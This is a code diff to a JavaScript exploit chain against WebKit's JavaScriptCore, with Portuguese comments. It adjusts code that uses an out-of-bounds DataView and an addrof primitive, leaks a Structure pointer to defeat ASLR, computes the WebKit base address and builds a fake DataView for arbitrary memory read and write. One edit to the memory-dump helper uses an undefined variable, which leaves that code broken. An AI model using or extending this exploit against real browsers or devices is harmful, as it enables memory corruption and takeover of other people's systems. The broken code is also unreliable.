@@ -50,7 +50,7 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
     logFn(`[${sourceName}] Iniciando dump de ${size} bytes a partir de ${address.toString(true)}`, "debug");
     const bytesPerRow = 16;
     for (let i = 0; i < size; i += bytesPerRow) {
-        let hexLine = address.add(i).toString(true) + ": ";
+        let hexLine = address.add(i + j).toString(16).padStart(2, '0') + " "; // Corrigido aqui
         let asciiLine = "  ";
         let rowBytes = [];
 
@@ -327,6 +327,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
     let webkit_base_address = null;
     let found_m_mode = null;
 
+    // Declaração da variável fora do try/catch para evitar redeclaração
+    let DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = null; 
+
     try {
         logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
         clearOOBEnvironment({ force_clear_even_if_not_setup: true });
@@ -402,11 +405,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         //  - AdvancedInt64.Zero (se o padrão de segurança for "não-compartilhado")
         const TEST_VALUE_FOR_0X40 = new AdvancedInt64(0x1, 0); // Exemplo: Flag de compartilhamento/redimensionamento ativada
 
-        // Outros campos podem ser testados conforme a análise:
-        // const TEST_VALUE_FOR_0X28 = AdvancedInt64.Zero; // Ou outro ponteiro de dados auxiliar
-        // const TEST_VALUE_FOR_0X38 = AdvancedInt64.Zero; // Ou outro ponteiro de dados auxiliar
-        // const TEST_VALUE_FOR_0X30 = 0x1000; // Um tamanho ou capacidade
-
         try {
             const oob_array_buffer_real_ref = oob_data_view.buffer; // O ArrayBuffer real controlado pelo OOB DataView
 
@@ -441,9 +439,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             logFn(`[ASLR LEAK] SUCESSO na leitura do ponteiro da Structure após ajuste: ${structure_address_from_leak.toString(true)}`, "leak");
 
             // O resto da Fase 3 continua igual se a leitura da Structure for bem-sucedida
-            const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FOR_FAKE = parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16);
-            const DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = webkit_base_address.add(new AdvancedInt64(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FOR_FAKE, 0));
-
+            const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
+            
             webkit_base_address = structure_address_from_leak.sub(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE);
 
             if (webkit_base_address.equals(AdvancedInt64.Zero) || (webkit_base_address.low() & 0xFFF) !== 0x000) {
@@ -468,7 +465,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
             logFn("--- FASE 4: Configurando a primitiva de L/E Arbitrária Universal (via fakeobj DataView) ---", "subtest");
             
-            const DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = webkit_base_address.add(new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0));
+            // Atribuição aqui (não 'const' para evitar redeclaração)
+            DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = webkit_base_address.add(new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0));
             logFn(`[${FNAME_CURRENT_TEST_BASE}] Endereço calculado do vtable da DataView Structure para FORJAMENTO: ${DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE.toString(true)}`, "info");
 
             const mModeCandidates = JSC_OFFSETS_PARAM.DataView.M_MODE_CANDIDATES;
